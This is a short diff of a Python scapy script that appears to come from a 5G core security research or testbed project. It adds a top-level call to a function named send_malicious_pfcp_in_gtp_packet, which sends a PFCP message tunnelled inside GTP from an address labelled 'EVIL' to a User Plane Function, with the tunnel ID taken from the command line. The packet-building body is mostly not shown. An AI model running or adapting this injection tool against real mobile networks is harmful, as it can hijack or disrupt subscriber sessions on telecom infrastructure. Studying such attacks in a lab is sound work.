@@ -1,11 +1,11 @@
 from scapy.all import *
 from scapy.contrib.gtp import *
 from scapy.contrib.pfcp import *
-from scapy.layers.inet import IP, ICMP
 import sys
-from scapy.all import arping, get_if_list
 import random
+import time
 from src import ip_list
+
 
 PFCP_PORT = 8805
 
@@ -96,3 +96,10 @@ def send_malicious_pfcp_in_gtp_packet(
     )
     send(packet)
     print(f"[+]  Packet sent successfully")
+
+
+send_malicious_pfcp_in_gtp_packet(
+    src_addr=ip_list["EVIL"],
+    dest_addr=ip_list["UPF"],
+    teid=sys.argv[1],
+)
